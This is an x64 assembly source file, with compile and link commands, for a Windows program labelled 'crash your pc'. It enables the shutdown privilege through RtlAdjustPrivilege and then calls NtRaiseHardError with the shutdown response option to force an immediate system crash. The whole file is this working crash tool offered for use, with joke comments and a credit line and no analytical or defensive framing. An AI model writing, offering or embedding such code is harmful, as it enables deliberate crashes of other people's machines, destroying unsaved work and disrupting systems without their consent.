; compile: ml64 /nologo /c /Zd crash.asm
; link: link /nologo /debug /ENTRY:main /subsystem:windows crash.obj ntdll.lib
; donate a blahaj to your local femboy
; crash your pc
extern RtlAdjustPrivilege:PROC
extern NtRaiseHardError:PROC

.code

PrivilegeState$ = 48 
ErrorResponse$  = 52  

main PROC
$LN3:
        sub     rsp, 72

        mov     BYTE PTR  PrivilegeState$[rsp], 0
        mov     DWORD PTR ErrorResponse$[rsp], 0

        lea     r9,  QWORD PTR PrivilegeState$[rsp] 
        xor     r8d, r8d                           
        mov     dl,  1                            
        mov     ecx, 19                          
        call    RtlAdjustPrivilege

        lea     rax, QWORD PTR ErrorResponse$[rsp]
        mov     QWORD PTR [rsp+40], rax               
        mov     DWORD PTR [rsp+32], 6                
        xor     r9d, r9d                            
        xor     r8d, r8d                           
        xor     edx, edx                          
        mov     ecx, -1073741818                 
        call    NtRaiseHardError

        ; credit sparkster here
        xor     eax, eax
        add     rsp, 72                                ; 00000048H
        ret     0
main ENDP

END
